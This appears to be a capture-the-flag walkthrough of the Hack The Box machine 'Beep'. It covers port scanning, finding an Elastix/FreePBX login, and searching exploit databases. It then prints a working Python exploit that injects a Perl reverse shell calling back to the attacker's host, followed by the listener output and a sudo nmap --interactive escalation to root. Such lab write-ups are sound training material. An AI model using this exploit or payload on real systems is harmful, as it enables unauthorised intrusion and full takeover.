# Beep

As always, I start by running nmap.

While using my default parametres -sV and -sC, I did not get any response.

So I tried -A which enables OS detection, version, detection, script scanning, and traceroute.
And I also added -v which increases verbosity. Essentially just gives more details.

```
kali@kali:~/htb/Beep$ sudo nmap -A -v 10.129.84.71
...
...
...
Discovered open port 995/tcp on 10.129.84.71
Discovered open port 25/tcp on 10.129.84.71
Discovered open port 22/tcp on 10.129.84.71
Discovered open port 443/tcp on 10.129.84.71
Discovered open port 111/tcp on 10.129.84.71
Discovered open port 110/tcp on 10.129.84.71
Discovered open port 3306/tcp on 10.129.84.71
Discovered open port 993/tcp on 10.129.84.71
Discovered open port 80/tcp on 10.129.84.71
Discovered open port 143/tcp on 10.129.84.71
Discovered open port 10000/tcp on 10.129.84.71
Discovered open port 4445/tcp on 10.129.84.71
```
We discover some interesting ports. 80 and 443 signals a website. So lets go check that out.

In order to gain access to the webpage, I need to enable TLS 1.0 on my browser.

After doing that though, we are greeted with a login-page. Powered by Elastix.

![](images/1.png)

I try to input some common credentials like admin/admin. Not only to see if I can get lucky, but also to see if there are some error messages for username and password that can be used with Hydra to crack it.

Nothing whatsoever. So I throw on dirbuster, and start checking manually. The first thing I try is /admin. And I get greeted by a popup login window.

![](images/2.png)

I try a couple credentials again, before cancelling the popup.

This redirects me to https://10.129.84.71/admin/config.php

![](images/3.png)

This also gives us a backend version. freepbx 2.8.1.4 

So lets throw both of these into searchsploit to see if we find something useful.

```
kali@kali:~/htb/Beep$ searchsploit Elastix
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                        | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities      | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilitie | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion             | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                            | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                           | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution       | php/webapps/18650.py
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Beep$ searchsploit freepbx 2.8.1.4 
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
FreePBX < 13.0.188 - Remote Command Execution (Metasploit)   | php/remote/40434.rb
Freepbx < 2.11.1.5 - Remote Code Execution                   | php/webapps/41005.txt
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

That FreePBX / Elastix RCE looks very likely. Although the FreePBX version is listed as 2.10.0, lets open it up and see what we can find.

The version is specified as: `Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.`

So our versions might match.


```
import urllib
rhost="10.129.84.71" # Target address
lhost="10.10.14.21"  # Our listening address
lport=443
extension="1000"

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.urlopen(url)
```


What is happening here?

There is an unsanitized parameter in the recordings/misc/callme_page.php page. And this parameter ends up in the Asterisk Management Interface socket. The payload is eventually executed on the VOIP server.

So I run the code:

```
IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)
```

Hmm. I did have to enable TLS 1.0 earlier, maybe I need to do some additional configuring in the connection.

```
import urllib.request
import ssl

rhost="10.129.84.71" # Target address
lhost="10.10.14.21"  # Our listening address
lport=443
extension=233

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.request.urlopen(url, context=ssl.SSLContext(ssl.PROTOCOL_TLSv1))
```

This one did the trick. I made sure the connection used TLS 1.0. In addition I had to change the extension. It used to be 1000.


```
kali@kali:~$ sudo rlwrap nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.84.71 53861
id
uid=100(asterisk) gid=101(asterisk)
```

We set the listener, and we are in. Our user is asterisk. In the exploit page, it explicitly states that we can exploit an nmap vulnerability to gain root. So lets try that.

```
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
